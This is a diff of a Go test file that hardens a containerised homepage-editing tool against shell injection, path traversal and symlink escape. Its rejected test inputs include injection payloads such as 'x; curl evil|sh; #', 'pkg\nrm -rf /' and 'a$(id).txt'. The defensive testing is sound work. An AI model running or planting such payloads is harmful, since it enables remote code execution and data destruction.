@@ -1,11 +1,14 @@
 package tools
 
 import (
+	"archive/tar"
+	"bytes"
 	"context"
 	"encoding/json"
 	"io"
 	"log/slog"
 	"net"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
@@ -235,6 +238,8 @@ func TestValidateHomepageSourceEditPathRejectsGeneratedOutput(t *testing.T) {
 		"ki-news-new/dist/index.html",
 		"ki-news-new/build/index.html",
 		"ki-news-new/out/index.html",
+		"site/dist/x",
+		"dist/x",
 	} {
 		if err := validateHomepageSourceEditPath(path); err == nil {
 			t.Fatalf("expected generated output path %q to be rejected", path)
@@ -704,8 +709,8 @@ func TestBuildFixPatterns_MissingNpmModule(t *testing.T) {
 			t.Fatal("expected missing-npm-module pattern to match")
 		}
 		fix := p.fix(m, "my-site")
-		if !strings.Contains(fix, "npm install react-router-dom") {
-			t.Errorf("expected fix to contain 'npm install react-router-dom', got: %s", fix)
+		if !strings.Contains(fix, "npm install 'react-router-dom'") {
+			t.Errorf("expected fix to contain the quoted 'npm install react-router-dom', got: %s", fix)
 		}
 	}
 }
@@ -722,7 +727,7 @@ func TestBuildFixPatterns_MissingNpmModuleSubpath(t *testing.T) {
 		}
 		fix := p.fix(m, "site")
 		// Should install just 'lodash', not 'lodash/debounce'
-		if !strings.Contains(fix, "npm install lodash") {
+		if !strings.Contains(fix, "npm install 'lodash'") {
 			t.Errorf("expected fix to install 'lodash', got: %s", fix)
 		}
 		if strings.Contains(fix, "lodash/debounce") {
@@ -742,7 +747,7 @@ func TestBuildFixPatterns_ScopedPackage(t *testing.T) {
 			t.Fatal("expected pattern to match")
 		}
 		fix := p.fix(m, "site")
-		if !strings.Contains(fix, "npm install @emotion/react") {
+		if !strings.Contains(fix, "npm install '@emotion/react'") {
 			t.Errorf("expected scoped package install, got: %s", fix)
 		}
 	}
@@ -759,7 +764,7 @@ func TestBuildFixPatterns_WebpackModuleNotFound(t *testing.T) {
 			t.Fatal("expected module-not-found-webpack pattern to match")
 		}
 		fix := p.fix(m, "site")
-		if !strings.Contains(fix, "npm install axios") {
+		if !strings.Contains(fix, "npm install 'axios'") {
 			t.Errorf("expected fix to install 'axios', got: %s", fix)
 		}
 	}
@@ -1204,5 +1209,364 @@ func TestRewriteLocalhostForContainer(t *testing.T) {
 		if got != tt.want {
 			t.Errorf("rewriteLocalhostForContainer(%q) = %q, want %q", tt.input, got, tt.want)
 		}
+	}
+}
+
+// ─── Homepage container path allowlist and shell quoting ──────────────────
+
+// TestValidateHomepagePathSegmentAllowlist pins the allowlist every container
+// path must pass before it can reach a command string.
+func TestValidateHomepagePathSegmentAllowlist(t *testing.T) {
+	tests := []struct {
+		name    string
+		path    string
+		allowed bool
+	}{
+		{name: "nested file", path: "a/b.txt", allowed: true},
+		{name: "source folder", path: "site/src/build/helpers.ts", allowed: true},
+		{name: "flat project file", path: "site/index.html", allowed: true},
+		{name: "space", path: "a b.txt", allowed: true},
+		{name: "unicode", path: "site/Über uns/日本語.txt", allowed: true},
+		{name: "combining mark", path: "site/Cafe\u0301.txt", allowed: true},
+		{name: "route group", path: "site/app/(group)/[slug]/page.tsx", allowed: true},
+		{name: "catchall route", path: "site/app/[[...slug]]/page.tsx", allowed: true},
+		{name: "parallel route", path: "site/app/@modal/(..)photo/page.tsx", allowed: true},
+		{name: "leading space", path: " site/a.txt", allowed: false},
+		{name: "trailing space", path: "site /a.txt", allowed: false},
+		{name: "tab", path: "a\tb.txt", allowed: false},
+		{name: "carriage return", path: "a\rb.txt", allowed: false},
+		{name: "nul", path: "a\x00b.txt", allowed: false},
+		{name: "bidi control", path: "a\u202eb.txt", allowed: false},
+		{name: "absolute", path: "/site/file.txt", allowed: false},
+		{name: "nested option", path: "site/-rf", allowed: false},
+		{name: "nested traversal", path: "site/../file.txt", allowed: false},
+		{name: "quoted", path: "site/'a'.txt", allowed: false},
+		{name: "backtick", path: "site/`id`.txt", allowed: false},
+		{name: "newline", path: "a\nb.txt", allowed: false},
+		{name: "semicolon", path: "a;b.txt", allowed: false},
+		{name: "command substitution", path: "a$(id).txt", allowed: false},
+		{name: "backslash", path: "a\\b.txt", allowed: false},
+		{name: "option like", path: "-rf", allowed: false},
+		{name: "traversal", path: "../escape.txt", allowed: false},
+		{name: "empty segment", path: "a//b.txt", allowed: false},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateHomepagePathSegment(tc.path)
+			if tc.allowed && err != nil {
+				t.Fatalf("expected %q to be allowed, got: %v", tc.path, err)
+			}
+			if !tc.allowed && err == nil {
+				t.Fatalf("expected %q to be rejected", tc.path)
+			}
+		})
+	}
+}
+
+// TestHomepageEditorRejectsUnsafePathBeforeAnyCommand proves a path that is
+// not on the allowlist never reaches the container: no command is issued, so
+// the payload can never become a second command.
+func TestHomepageEditorRejectsUnsafePathBeforeAnyCommand(t *testing.T) {
+	oldExec := homepageDockerExecFunc
+	t.Cleanup(func() { homepageDockerExecFunc = oldExec })
+
+	dockerHost := "unit-test-homepage-unsafe-path"
+	dockerAvailabilityMu.Lock()
+	dockerAvailabilityResults[dockerHost] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
+	dockerAvailabilityMu.Unlock()
+	t.Cleanup(func() { invalidateDockerAvailabilityCache(dockerHost) })
+
+	var commands []string
+	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
+		commands = append(commands, command)
+		return `{"status":"ok","exit_code":0,"output":"{}"}`
+	}
+
+	cfg := HomepageConfig{DockerHost: dockerHost}
+	unsafe := []string{"a\tb.txt", "a\nb.txt", "a;b.txt", "a$(id).txt", "a\\b.txt", "-rf", "../escape.txt", "a//b.txt", "a/[slug]/../../escape.txt", "a/(group)/file;id.txt"}
+	for _, p := range unsafe {
+		result := HomepageJsonEdit(cfg, p, "set", "a", "b", "", slogDiscard())
+		if !strings.Contains(result, `"status":"error"`) {
+			t.Fatalf("expected %q to be rejected, got: %s", p, result)
+		}
+	}
+	if len(commands) != 0 {
+		t.Fatalf("expected no container command for rejected paths, got: %v", commands)
+	}
+}
+
+// TestHomepageWriteFileNewlinePathCannotCreateSecondFile proves a newline in a
+// path cannot split a container command into two commands, so no second file
+// can be created next to the requested one.
+func TestHomepageWriteFileNewlinePathCannotCreateSecondFile(t *testing.T) {
+	oldExec := homepageDockerExecFunc
+	t.Cleanup(func() { homepageDockerExecFunc = oldExec })
+
+	dockerHost := "unit-test-homepage-newline-path"
+	dockerAvailabilityMu.Lock()
+	dockerAvailabilityResults[dockerHost] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
+	dockerAvailabilityMu.Unlock()
+	t.Cleanup(func() { invalidateDockerAvailabilityCache(dockerHost) })
+
+	var commands []string
+	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
+		commands = append(commands, command)
+		return `{"status":"ok","exit_code":0,"output":""}`
+	}
+
+	result := HomepageWriteFile(HomepageConfig{DockerHost: dockerHost}, "ki-news/a\nb.txt", "payload", slogDiscard())
+	if !strings.Contains(result, `"status":"error"`) {
+		t.Fatalf("expected newline path to be rejected, got: %s", result)
+	}
+	if len(commands) != 0 {
+		t.Fatalf("expected no container command for a newline path, got: %v", commands)
+	}
+	for _, command := range commands {
+		if strings.Contains(command, "b.txt") {
+			t.Fatalf("newline path reached a container command: %s", command)
+		}
+	}
+}
+
+// ─── Failed Homepage writes are reported as failures ──────────────────────
+
+// homepageArchiveTar builds a single-file tar archive for the archive test engine.
+func homepageArchiveTar(t *testing.T, name, content string) []byte {
+	t.Helper()
+	var buf bytes.Buffer
+	writer := tar.NewWriter(&buf)
+	if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0644, Size: int64(len(content))}); err != nil {
+		t.Fatalf("archive header: %v", err)
+	}
+	if _, err := writer.Write([]byte(content)); err != nil {
+		t.Fatalf("archive body: %v", err)
+	}
+	if err := writer.Close(); err != nil {
+		t.Fatalf("archive close: %v", err)
+	}
+	return buf.Bytes()
+}
+
+// homepageEditorDockerEngine serves the archive download used by the Homepage
+// editors and forces Docker availability for the returned engine.
+func homepageEditorDockerEngine(t *testing.T, fileName, content string) DockerConfig {
+	t.Helper()
+	configureDockerSecurityTestPermissions(t, false)
+	archive := homepageArchiveTar(t, fileName, content)
+	cfg := newArchiveTestEngine(t, func(w http.ResponseWriter, r *http.Request) {
+		if !strings.HasSuffix(r.URL.Path, "/archive") {
+			t.Errorf("unexpected Docker request: %s %s", r.Method, r.URL)
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		if r.Method == http.MethodGet {
+			w.Header().Set("Content-Type", "application/x-tar")
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write(archive)
+			return
+		}
+		if r.Method == http.MethodPut {
+			_, _ = io.Copy(io.Discard, r.Body)
+			w.WriteHeader(http.StatusOK)
+			return
+		}
+		t.Errorf("unexpected Docker request: %s %s", r.Method, r.URL)
+		w.WriteHeader(http.StatusNotFound)
+	})
+	dockerAvailabilityMu.Lock()
+	dockerAvailabilityResults[cfg.Host] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
+	dockerAvailabilityMu.Unlock()
+	t.Cleanup(func() { invalidateDockerAvailabilityCache(cfg.Host) })
+	return cfg
+}
+
+// TestHomepageJsonEditReportsWriteFailureAsError proves a failed container
+// write is reported as a failure instead of a success payload.
+func TestHomepageJsonEditReportsWriteFailureAsError(t *testing.T) {
+	oldExec := homepageDockerExecFunc
+	t.Cleanup(func() { homepageDockerExecFunc = oldExec })
+
+	dockerCfg := homepageEditorDockerEngine(t, "config.json", `{"port":80}`)
+	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
+		return `{"status":"error","exit_code":1,"output":"permission denied"}`
+	}
+
+	result := HomepageJsonEdit(HomepageConfig{DockerHost: dockerCfg.Host}, "ki-news/config.json", "set", "port", "8080", "", slogDiscard())
+	if !strings.Contains(result, `"status":"error"`) {
+		t.Fatalf("expected a failed write to be reported as an error, got: %s", result)
+	}
+	if strings.Contains(result, `"status":"ok"`) {
+		t.Fatalf("expected no success payload for a failed write, got: %s", result)
+	}
+	if !strings.Contains(result, "permission denied") {
+		t.Fatalf("expected the container message in the failure, got: %s", result)
+	}
+}
+
+// TestHomepageJsonEditReportsReadFailureAsError proves a failed container read
+// is reported as a failure instead of an empty file.
+func TestHomepageJsonEditReportsReadFailureAsError(t *testing.T) {
+	oldExec := homepageDockerExecFunc
+	t.Cleanup(func() { homepageDockerExecFunc = oldExec })
+
+	configureDockerSecurityTestPermissions(t, false)
+	dockerCfg := newArchiveTestEngine(t, func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusNotFound)
+		_, _ = io.WriteString(w, `{"message":"No such file"}`)
+	})
+	dockerAvailabilityMu.Lock()
+	dockerAvailabilityResults[dockerCfg.Host] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
+	dockerAvailabilityMu.Unlock()
+	t.Cleanup(func() { invalidateDockerAvailabilityCache(dockerCfg.Host) })
+
+	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
+		return `{"status":"ok","exit_code":0,"output":""}`
+	}
+
+	result := HomepageJsonEdit(HomepageConfig{DockerHost: dockerCfg.Host}, "ki-news/missing.json", "get", "port", nil, "", slogDiscard())
+	if !strings.Contains(result, `"status":"error"`) {
+		t.Fatalf("expected a failed read to be reported as an error, got: %s", result)
+	}
+	if strings.Contains(result, `"status":"ok"`) {
+		t.Fatalf("expected no success payload for a failed read, got: %s", result)
+	}
+}
+
+// TestHomepageJsonEditKeepsSuccessPayload proves the success payload is
+// unchanged when the container write succeeds.
+func TestHomepageJsonEditKeepsSuccessPayload(t *testing.T) {
+	oldExec := homepageDockerExecFunc
+	t.Cleanup(func() { homepageDockerExecFunc = oldExec })
+
+	dockerCfg := homepageEditorDockerEngine(t, "config.json", `{"port":80}`)
+	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
+		return `{"status":"ok","exit_code":0,"output":""}`
+	}
+
+	result := HomepageJsonEdit(HomepageConfig{DockerHost: dockerCfg.Host}, "ki-news/config.json", "set", "port", "8080", "", slogDiscard())
+	if !strings.Contains(result, `"status":"ok"`) {
+		t.Fatalf("expected a successful write to keep the success payload, got: %s", result)
+	}
+	if strings.Contains(result, `"status":"error"`) {
+		t.Fatalf("expected no error payload for a successful write, got: %s", result)
+	}
+}
+
+// ─── Symlink-safe workspace paths ─────────────────────────────────────────
+
+// ─── Dependency and build-output allowlists ──────────────────────────────
+
+// TestValidateHomepagePackageNameAllowlist pins the package requirements the
+// Homepage dependency install accepts.
+func TestValidateHomepagePackageNameAllowlist(t *testing.T) {
+	tests := []struct {
+		name    string
+		pkg     string
+		allowed bool
+	}{
+		{name: "plain package", pkg: "left-pad", allowed: true},
+		{name: "scoped package", pkg: "@scope/pkg", allowed: true},
+		{name: "pinned version", pkg: "pkg@1.2.3", allowed: true},
+		{name: "range version", pkg: "pkg@^1.0.0", allowed: true},
+		{name: "scoped with version", pkg: "@scope/pkg@1.2.3", allowed: true},
+		{name: "command chain", pkg: "x; curl evil|sh; #", allowed: false},
+		{name: "url", pkg: "https://evil.tgz", allowed: false},
+		{name: "local path", pkg: "./local", allowed: false},
+		{name: "parent path", pkg: "../x", allowed: false},
+		{name: "flag", pkg: "pkg -g", allowed: false},
+		{name: "newline", pkg: "pkg\nrm -rf /", allowed: false},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateHomepagePackageName(tc.pkg)
+			if tc.allowed && err != nil {
+				t.Fatalf("expected %q to be allowed, got: %v", tc.pkg, err)
+			}
+			if !tc.allowed && err == nil {
+				t.Fatalf("expected %q to be rejected", tc.pkg)
+			}
+		})
+	}
+}
+
+// TestHomepageInstallDepsRejectsPackageOutsideAllowlist proves a package
+// requirement outside the allowlist never reaches the container shell.
+func TestHomepageInstallDepsRejectsPackageOutsideAllowlist(t *testing.T) {
+	oldExec := homepageDockerExecFunc
+	t.Cleanup(func() { homepageDockerExecFunc = oldExec })
+
+	var commands []string
+	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
+		commands = append(commands, command)
+		return `{"status":"ok","exit_code":0,"output":""}`
+	}
+
+	cfg := HomepageConfig{DockerHost: "unit-test-homepage-install-deps"}
+	rejected := []string{"x; curl evil|sh; #", "https://evil.tgz", "./local", "../x", "pkg -g", "pkg\nrm -rf /"}
+	for _, pkg := range rejected {
+		result := HomepageInstallDeps(cfg, "ki-news", []string{pkg}, slogDiscard())
+		if !strings.Contains(result, `"status":"error"`) {
+			t.Fatalf("expected %q to be rejected, got: %s", pkg, result)
+		}
+	}
+	for _, command := range commands {
+		if strings.Contains(command, ";") || strings.Contains(command, "|") {
+			t.Fatalf("a rejected package reached a container command: %s", command)
+		}
+	}
+}
+
+// TestBuildFixPatternsRejectMaliciousDependencyName proves a build output that
+// carries a malicious dependency name never produces an install command.
+func TestBuildFixPatternsRejectMaliciousDependencyName(t *testing.T) {
+	outputs := []string{
+		"Error: Cannot find module 'x; curl evil|sh; #'",
+		"Error: Cannot find module 'https://evil.tgz'",
+		"Error: Cannot find module './local'",
+		"error TS2307: Cannot find module 'x | tee /tmp/pwned'",
+	}
+	for _, output := range outputs {
+		for _, p := range buildFixPatterns {
+			m := p.pattern.FindStringSubmatch(output)
+			if m == nil {
+				continue
+			}
+			fix := p.fix(m, "site")
+			if fix == "" {
+				continue
+			}
+			if strings.Contains(fix, ";") || strings.Contains(fix, "|") {
+				t.Fatalf("pattern %q produced a command with shell syntax for %q: %s", p.name, output, fix)
+			}
+			if !strings.Contains(fix, "npm install") {
+				continue
+			}
+			if err := validateHomepagePackageName(strings.Trim(strings.TrimPrefix(fix[strings.Index(fix, "npm install ")+len("npm install "):], " "), "'")); err != nil {
+				t.Fatalf("pattern %q produced an install command outside the allowlist: %s", p.name, fix)
+			}
+		}
+	}
+}
+
+// TestResolveHomepagePathRejectsSymlinkEscape proves a symlink inside the
+// workspace that points outside of it is rejected by the local write path.
+func TestResolveHomepagePathRejectsSymlinkEscape(t *testing.T) {
+	workspace := t.TempDir()
+	outside := t.TempDir()
+	if err := os.WriteFile(filepath.Join(outside, "secret.txt"), []byte("secret"), 0644); err != nil {
+		t.Fatalf("write outside file: %v", err)
+	}
+	if err := os.Symlink(outside, filepath.Join(workspace, "escape")); err != nil {
+		t.Skipf("symlinks are not available on this host: %v", err)
+	}
+
+	if _, err := resolveHomepagePath(workspace, "escape/secret.txt"); err == nil {
+		t.Fatal("expected a symlink pointing outside the workspace to be rejected")
+	}
+	if _, err := resolveHomepagePath(workspace, "../escape.txt"); err == nil {
+		t.Fatal("expected a traversal path to be rejected")
+	}
+	if _, err := resolveHomepagePath(workspace, "inside/file.txt"); err != nil {
+		t.Fatalf("expected a path inside the workspace to be allowed, got: %v", err)
 	}
 }
